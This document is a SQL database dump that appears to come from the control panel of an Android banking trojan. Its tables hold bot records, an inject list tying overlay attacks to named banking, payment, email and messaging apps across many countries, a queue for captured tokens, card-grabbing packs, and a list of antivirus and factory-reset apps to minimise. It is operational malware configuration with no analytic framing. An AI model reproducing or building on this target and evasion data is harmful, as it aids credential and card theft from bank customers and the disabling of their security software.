SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `general`
--

-- --------------------------------------------------------

--
-- Table structure for table `blocked_bots`
--

CREATE TABLE IF NOT EXISTS `blocked_bots` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bot_id` varchar(32) NOT NULL,
  `ip` varchar(15) NOT NULL,
  `ts` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=2 ;

--
-- Dumping data for table `blocked_bots`
--


-- --------------------------------------------------------

--
-- Table structure for table `bot_socks`
--

CREATE TABLE IF NOT EXISTS `bot_socks` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bot_id` varchar(32) CHARACTER SET utf8 NOT NULL,
  `status` text CHARACTER SET utf8 COLLATE utf8_unicode_ci,
  `is_online` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `bot_id` (`bot_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

--
-- Dumping data for table `bot_socks`
--


-- --------------------------------------------------------

--
-- Table structure for table `cc_on_list`
--

CREATE TABLE IF NOT EXISTS `cc_on_list` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `package` varchar(128) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `cc_on_list`
--

INSERT INTO `cc_on_list` (`id`, `package`) VALUES
(1, 'general_cc_pack1'),
(2, 'general_cc_pack2');

-- --------------------------------------------------------

--
-- Table structure for table `groups`
--

CREATE TABLE IF NOT EXISTS `groups` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(256) NOT NULL,
  `notes` varchar(128) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=18 ;

--
-- Dumping data for table `groups`
--

INSERT INTO `groups` (`id`, `title`, `notes`) VALUES
(1, 'at', 'Austria'),
(2, 'de', 'Germany'),
(3, 'uk', 'United Kingdom'),
(4, 'th', 'Thailand'),
(6, 'au', 'Australia'),
(8, 'custom', 'Extra'),
(9, 'fr', 'French'),
(10, 'socials', 'Social networks, messengers<br /><span style=''font-weight: normal''>(with en, fr, de, tr, es, it localizations)</span>'),
(11, 'tr', 'Turkey'),
(13, 'jp', 'Japan'),
(14, 'in', 'India'),
(17, 'ro', 'Romania');

-- --------------------------------------------------------

--
-- Table structure for table `injects`
--

CREATE TABLE IF NOT EXISTS `injects` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `group_id` int(11) NOT NULL,
  `app` varchar(256) NOT NULL,
  `folder` varchar(128) NOT NULL,
  `used` int(11) NOT NULL DEFAULT '0' COMMENT 'number of times when inject was filled and saved',
  PRIMARY KEY (`id`),
  UNIQUE KEY `group_id` (`group_id`,`app`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=191 ;

--
-- Dumping data for table `injects`
--

INSERT INTO `injects` (`id`, `group_id`, `app`, `folder`, `used`) VALUES
(1, 1, 'at.bawag.mbanking', 'at.bawag.mbanking', 20),
(2, 1, 'at.easybank.mbanking', 'at.easybank.mbanking', 0),
(3, 1, 'at.spardat.netbanking', 'at.spardat.netbanking', 0),
(4, 1, 'at.volksbank.volksbankmobile', 'at.volksbank.volksbankmobile', 0),
(5, 1, 'com.bankaustria.android.olb', 'com.bankaustria.android.olb', 0),
(7, 10, 'com.whatsapp', 'com.whatsapp', 9),
(8, 2, 'com.db.mm.deutschebank', 'com.db.mm.deutschebank', 0),
(9, 2, 'com.ing.diba.mbbr2', 'com.ing.diba.mbbr2', 0),
(10, 2, 'com.isis_papyrus.raiffeisen_pay_eyewdg', 'com.isis_papyrus.raiffeisen_pay_eyewdg', 0),
(11, 2, 'com.starfinanz.smob.android.sfinanzstatus', 'com.starfinanz.smob.android.sfinanzstatus', 0),
(12, 2, 'de.comdirect.android', 'de.comdirect.android', 0),
(13, 2, 'de.commerzbanking.mobil', 'de.commerzbanking.mobil', 0),
(14, 2, 'de.consorsbank', 'de.consorsbank', 0),
(15, 2, 'de.dkb.portalapp', 'de.dkb.portalapp', 0),
(16, 2, 'de.fiducia.smartphone.android.banking.vr', 'de.fiducia.smartphone.android.banking.vr', 0),
(17, 2, 'de.postbank.finanzassistent', 'de.postbank.finanzassistent', 1),
(18, 2, 'mobile.santander.de', 'mobile.santander.de', 0),
(19, 3, 'com.barclays.android.barclaysmobilebanking', 'com.barclays.android.barclaysmobilebanking', 0),
(20, 3, 'com.grppl.android.shell.BOS', 'com.grppl.android.shell.BOS', 0),
(21, 3, 'com.grppl.android.shell.CMBlloydsTSB73', 'com.grppl.android.shell.CMBlloydsTSB73', 0),
(22, 3, 'com.grppl.android.shell.halifax', 'com.grppl.android.shell.halifax', 0),
(23, 3, 'com.htsu.hsbcpersonalbanking', 'com.htsu.hsbcpersonalbanking', 0),
(24, 3, 'com.rbs.mobile.android.natwest', 'com.rbs.mobile.android.natwest', 0),
(25, 3, 'com.rbs.mobile.android.rbs', 'com.rbs.mobile.android.rbs', 0),
(26, 3, 'com.rbs.mobile.android.ubr', 'com.rbs.mobile.android.ubr', 0),
(27, 3, 'uk.co.santander.santanderUK', 'uk.co.santander.santanderUK', 0),
(28, 3, 'uk.co.tsb.mobilebank', 'uk.co.tsb.mobilebank', 0),
(29, 4, 'com.bbl.mobilebanking', 'com.bbl.mobilebanking', 0),
(30, 4, 'com.kasikornbank.retail.kmerchant', 'com.kasikornbank.retail.kmerchant', 0),
(31, 4, 'com.scb.phone', 'com.scb.phone', 0),
(32, 4, 'ktbcs.netbank', 'ktbcs.netbank', 0),
(56, 6, 'au.com.bankwest.mobile', 'au.com.bankwest.mobile', 0),
(57, 6, 'au.com.ingdirect.android', 'au.com.ingdirect.android', 0),
(58, 6, 'au.com.nab.mobile', 'au.com.nab.mobile', 0),
(59, 6, 'com.commbank.netbank', 'com.commbank.netbank', 0),
(60, 6, 'org.banksa.bank', 'org.banksa.bank', 0),
(61, 6, 'org.stgeorge.bank', 'org.stgeorge.bank', 0),
(62, 6, 'org.westpac.bank', 'org.westpac.bank', 0),
(67, 2, 'de.ing_diba.kontostand', 'com.ing.diba.mbbr2', 0),
(68, 2, 'de.adesso.mobile.android.gadfints', 'de.fiducia.smartphone.android.banking.vr', 0),
(69, 2, 'com.starfinanz.mobile.android.dkbpushtan', 'de.dkb.portalapp', 0),
(70, 2, 'com.starfinanz.smob.android.sbanking', 'com.starfinanz.smob.android.sfinanzstatus', 0),
(71, 4, 'com.kasikorn.retail.mbanking.wap', 'com.kasikornbank.retail.kmerchant', 0),
(72, 4, 'com.scb.tablet', 'com.scb.phone', 0),
(73, 4, 'com.SCBBizNet', 'com.scb.phone', 0),
(74, 4, 'com.scbup2me', 'com.scb.phone', 0),
(75, 4, 'th.co.ktam.ktampvd', 'ktbcs.netbank', 0),
(76, 4, 'com.ktb.bizgrowing', 'ktbcs.netbank', 0),
(77, 8, 'com.ing.mobile', 'com.ing.mobile', 2),
(78, 10, 'com.instagram.android', 'com.instagram.android', 1),
(79, 10, 'com.android.vending', 'com.android.vending', 1),
(80, 10, 'com.facebook.katana', 'com.facebook.katana', 0),
(81, 10, 'com.skype.raider', 'com.skype.raider', 1),
(82, 10, 'com.viber.voip', 'com.viber.voip', 1),
(83, 9, 'com.caisseepargne.android.mobilebanking', 'com.caisseepargne.android.mobilebanking', 0),
(84, 9, 'fr.lcl.android.customerarea', 'fr.lcl.android.customerarea', 0),
(85, 9, 'net.bnpparibas.mescomptes', 'net.bnpparibas.mescomptes', 0),
(86, 8, 'com.google.android.gm', 'com.google.android.gm', 5),
(87, 9, 'com.cic_prod.bad', 'com.cic_prod.bad', 0),
(88, 9, 'com.fullsix.android.labanquepostale.accountaccess', 'com.fullsix.android.labanquepostale.accountaccess', 0),
(89, 9, 'fr.banquepopulaire.cyberplus', 'fr.banquepopulaire.cyberplus', 0),
(90, 9, 'fr.creditagricole.androidapp', 'fr.creditagricole.androidapp', 0),
(91, 9, 'mobi.societegenerale.mobile.lappli', 'mobi.societegenerale.mobile.lappli', 0),
(92, 8, 'pt.santandertotta.mobileparticulares', 'pt.santandertotta.mobileparticulares', 0),
(93, 8, 'wit.android.bcpBankingApp.millennium', 'wit.android.bcpBankingApp.millennium', 0),
(94, 9, 'com.IngDirectAndroid', 'au.com.ingdirect.android', 0),
(95, 9, 'fr.bred.fr', 'fr.bred.fr', 0),
(96, 8, 'com.amazon.mShop.android.shopping', 'com.amazon.mShop.android.shopping', 0),
(97, 9, 'fr.lcl.android.entreprise', 'fr.lcl.android.entreprise', 0),
(98, 9, 'mobi.societegenerale.mobile.lapplipro', 'mobi.societegenerale.mobile.lappli', 0),
(99, 9, 'com.axabanque.fr', 'com.axabanque.fr', 0),
(100, 9, 'com.fpe.comptenickel', 'com.fpe.comptenickel', 1),
(101, 9, 'com.carrefour.bank', 'com.carrefour.bank', 0),
(102, 9, 'com.bnpp.easybanking', 'com.bnpp.easybanking', 0),
(103, 8, 'com.paypal.android.p2pmobile', 'com.paypal.android.p2pmobile', 0),
(104, 8, 'com.westernunion.moneytransferr3app.eu', 'com.westernunion.moneytransferr3app.eu', 0),
(105, 9, 'fr.banquepopulaire.cyberplus.pro', 'fr.banquepopulaire.cyberplus.pro', 0),
(106, 11, 'com.akbank.android.apps.akbank_direkt', 'com.akbank.android.apps.akbank_direkt', 2),
(107, 11, 'com.akbank.softotp', 'com.akbank.android.apps.akbank_direkt', 0),
(108, 11, 'com.teb', 'com.teb', 0),
(109, 11, 'com.finansbank.mobile.cepsube', 'com.finansbank.mobile.cepsube', 0),
(110, 11, 'com.garanti.cepbank', 'com.garanti.cepsubesi', 0),
(111, 11, 'biz.mobinex.android.apps.cep_sifrematik', 'biz.mobinex.android.apps.cep_sifrematik', 0),
(112, 11, 'com.garanti.cepsubesi', 'com.garanti.cepsubesi', 0),
(113, 11, 'com.tmobtech.halkbank', 'com.tmobtech.halkbank', 0),
(114, 11, 'com.ingbanktr.ingmobil', 'com.ingbanktr.ingmobil', 0),
(115, 11, 'com.pozitron.iscep', 'com.pozitron.iscep', 3),
(116, 11, 'com.intertech.mobilemoneytransfer.activity', 'com.tmob.denizbank', 0),
(117, 11, 'com.tmob.denizbank', 'com.tmob.denizbank', 0),
(118, 11, 'tr.com.sekerbilisim.mbank', 'tr.com.sekerbilisim.mbank', 0),
(119, 11, 'com.vakifbank.mobile', 'com.vakifbank.mobile', 0),
(120, 11, 'com.ykb.android.mobilonay', 'com.ykb.android', 0),
(121, 11, 'com.ykb.androidtablet', 'com.ykb.android', 0),
(122, 11, 'com.ykb.android', 'com.ykb.android', 0),
(123, 11, 'com.ziraat.ziraatmobil', 'com.ziraat.ziraatmobil', 0),
(124, 11, 'com.akbank.android.apps.akbank_direkt_tablet', 'com.akbank.android.apps.akbank_direkt', 0),
(125, 9, 'fr.axa.soon', 'fr.axa.soon', 0),
(126, 9, 'com.mona_prod.bad', 'com.mona_prod.bad', 0),
(127, 9, 'com.bforbank.androidapp', 'com.bforbank.androidapp', 0),
(128, 9, 'com.palatine.android.mobilebanking.prod', 'com.palatine.android.mobilebanking.prod', 0),
(129, 9, 'com.htsu.hsbcpersonalbanking', 'com.htsu.hsbcpersonalbanking', 0),
(130, 9, 'com.ocito.cdn.activity.banquecourtois2', 'com.ocito.cdn.activity.banquecourtois2', 0),
(131, 9, 'com.fortuneo.android', 'com.fortuneo.android', 0),
(132, 10, 'com.facebook.orca', 'com.facebook.katana', 0),
(133, 9, 'com.cm_prod.bad', 'com.cm_prod.bad', 1),
(134, 9, 'fr.laposte.lapostemobile', 'fr.laposte.lapostemobile', 2),
(140, 13, 'jp.co.japannetbank.smtapp.balance', 'jp.co.japannetbank.smtapp.balance', 6),
(141, 13, 'jp.co.netbk', 'jp.co.netbk', 10),
(142, 13, 'jp.co.rakuten_bank.rakutenbank', 'jp.co.rakuten_bank.rakutenbank', 3),
(143, 13, 'jp.co.sevenbank.AppPassbook', 'jp.co.sevenbank.AppPassbook', 1),
(144, 13, 'jp.co.smbc.direct', 'jp.co.smbc.direct', 4),
(145, 13, 'jp.mufg.bk.applisp.app', 'jp.mufg.bk.applisp.app', 3),
(146, 2, 'spadrat.de', 'spadrat.de', 14),
(147, 14, 'in.co.bankofbaroda.mpassbook', 'in.co.bankofbaroda.mpassbook', 5),
(148, 14, 'src.com.idbi', 'src.com.idbi', 1),
(149, 14, 'com.sbi.SBFreedom', 'com.sbi.SBFreedom', 1),
(150, 14, 'com.axis.mobile', 'com.axis.mobile', 1),
(151, 14, 'hdfcbank.hdfcquickbank', 'hdfcbank.hdfcquickbank', 1),
(152, 14, 'com.csam.icici.bank.imobile', 'com.csam.icici.bank.imobile', 1),
(153, 14, 'com.snapwork.hdfc', 'com.snapwork.hdfc', 1),
(154, 14, 'com.unionbank.ecommerce.mobile.android', 'com.unionbank.ecommerce.mobile.android', 1),
(155, 14, 'com.sbi.SBIFreedomPlus', 'com.sbi.SBIFreedomPlus', 1),
(156, 1, 'com.bankofqueensland.boq', 'com.bankofqueensland.boq', 1),
(157, 1, 'au.com.suncorp.SuncorpBank', 'au.com.suncorp.SuncorpBank', 1),
(158, 1, 'au.com.cua.mb', 'au.com.cua.mb', 1),
(159, 1, 'com.citibank.mobile.au', 'com.citibank.mobile.au', 1),
(160, 1, 'com.bendigobank.mobile', 'com.bendigobank.mobile', 1),
(161, 1, 'au.com.newcastlepermanent', 'au.com.newcastlepermanent', 1),
(162, 1, 'com.imb.banking2', 'com.imb.banking2', 1),
(163, 1, 'au.com.mebank.banking', 'au.com.mebank.banking', 1),
(164, 1, 'org.bom.bank', 'org.bom.bank', 4),
(165, 1, 'com.anz.SingaporeDigitalBanking', 'com.anz.SingaporeDigitalBanking', 1),
(166, 1, 'com.fusion.ATMLocator', 'com.fusion.ATMLocator', 1),
(175, 17, 'com.advantage.RaiffeisenBank', 'com.advantage.RaiffeisenBank', 1),
(176, 17, 'hr.asseco.android.jimba.mUCI.ro', 'hr.asseco.android.jimba.mUCI.ro', 2),
(177, 17, 'may.maybank.android', 'may.maybank.android', 1),
(178, 17, 'ro.btrl.mobile', 'ro.btrl.mobile', 2),
(179, 8, 'com.connectivityapps.hotmail', 'com.connectivityapps.hotmail', 2),
(180, 8, 'com.mail.mobile.android.mail', 'com.mail.mobile.android.mail', 1),
(182, 11, 'com.kuveytturk.mobil', 'com.kuveytturk.mobil', 7),
(183, 11, 'com.magiclick.odeabank', 'com.magiclick.odeabank', 0),
(184, 11, 'com.pozitron.albarakaturk', 'com.pozitron.albarakaturk', 0),
(185, 11, 'com.pozitron.vakifbank', 'com.pozitron.vakifbank', 0),
(186, 11, 'com.softtech.isbankasi', 'com.softtech.isbankasi', 0),
(187, 11, 'com.tmob.tabletdeniz', 'com.tmob.tabletdeniz', 0),
(188, 11, 'com.ziraat.ziraattablet', 'com.ziraat.ziraattablet', 0),
(189, 11, 'finansbank.enpara', 'finansbank.enpara', 0),
(190, 11, 'com.htsu.hsbcpersonalbanking', 'com.htsu.hsbcpersonalbanking', 0);

-- --------------------------------------------------------

--
-- Table structure for table `injects_queue`
--

CREATE TABLE IF NOT EXISTS `injects_queue` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `bot_id` int(11) NOT NULL,
  `app` varchar(256) NOT NULL,
  `step` enum('injects','inject_tokens','inject_coordinates') DEFAULT 'injects',
  `data` text,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uniq_id` (`bot_id`,`app`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

--
-- Dumping data for table `injects_queue`
--


-- --------------------------------------------------------

--
-- Table structure for table `minimize_apps_list`
--

CREATE TABLE IF NOT EXISTS `minimize_apps_list` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `package` varchar(128) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=39 ;

--
-- Dumping data for table `minimize_apps_list`
--

INSERT INTO `minimize_apps_list` (`id`, `package`) VALUES
(3, 'avg.antivirus'),
(4, 'avg.antivirus'),
(5, 'com.anhlt.antiviruspro'),
(6, 'com.antivirus'),
(7, 'com.antivirus.tablet'),
(8, 'com.avast.android.mobilesecurity'),
(9, 'com.avira.android'),
(10, 'com.bitdefender.antivirus'),
(11, 'com.cleanmaster.boost'),
(12, 'com.cleanmaster.mguard'),
(13, 'com.cleanmaster.mguard_x8'),
(14, 'com.cleanmaster.sdk'),
(15, 'com.cleanmaster.security'),
(16, 'com.dianxinos.optimizer.duplay'),
(17, 'com.drweb'),
(18, 'com.duapps.antivirus'),
(19, 'com.eset.ems.gp'),
(20, 'com.eset.ems2.gp'),
(21, 'com.ikarus.mobile.security'),
(22, 'com.kms.free'),
(23, 'com.netqin.antivirus'),
(24, 'com.nqmobile.antivirus20'),
(25, 'com.nqmobile.antivirus20.clarobr'),
(26, 'com.piriform.ccleaner'),
(27, 'com.psafe.msuite'),
(28, 'com.qihoo.security'),
(29, 'com.qihoo.security.lite'),
(30, 'com.referplish.VirusRemovalForAndroid'),
(31, 'com.sonyericsson.mtp.extension.factoryreset'),
(32, 'com.symantec.mobilesecurity'),
(33, 'com.thegoldengoodapps.phone_cleaning_virus_free.cleaner.booster'),
(34, 'com.trustlook.antivirus'),
(35, 'com.womboidsystems.antivirus.security.android'),
(36, 'com.zrgiu.antivirus'),
(37, 'droiddudes.best.anitvirus'),
(38, 'oem.antivirus');
